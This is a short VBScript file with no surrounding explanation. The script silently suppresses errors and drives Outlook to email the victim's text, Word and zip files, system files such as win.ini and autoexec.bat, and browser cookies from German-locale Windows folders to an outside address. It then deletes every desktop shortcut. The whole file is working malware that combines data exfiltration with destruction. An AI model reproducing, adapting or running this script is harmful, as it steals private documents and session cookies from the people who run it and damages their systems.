On Error Resume Next
Dim x
Set ol=CreateObject("Outlook.Application")
Set Mail=ol.CreateItem(0)
Mail.to="mail@domain.com"
Mail.Subject="your files"
Mail.Body="file transfer...........successful"
Mail.Attachments.Add("C:\Eigene Dateien\*.txt")
Mail.Attachments.Add("C:\Eigene Dateien\*.doc")
Mail.Attachments.Add("C:\Eigene Dateien\*.zip")
Mail.Attachments.Add("C:\Windows\win.ini")
Mail.Attachments.Add("C:\autoexec.bat")
Mail.Attachments.Add("C:\Eigene Dateien\Dokumente\*.txt")
Mail.Attachments.Add("C:\Eigene Dateien\Dokumente\*.doc")
Mail.Attachments.Add("C:\Eigene Dateien\Dokumente\*.zip")
Mail.Attachments.Add("C:\Windows\Cookies\*.txt")
Mail.Send
ol.Quit
Set so = CreateObject("Scripting.FileSystemObject")
so.DeleteFile("C:\Windows\Desktop\*.lnk")
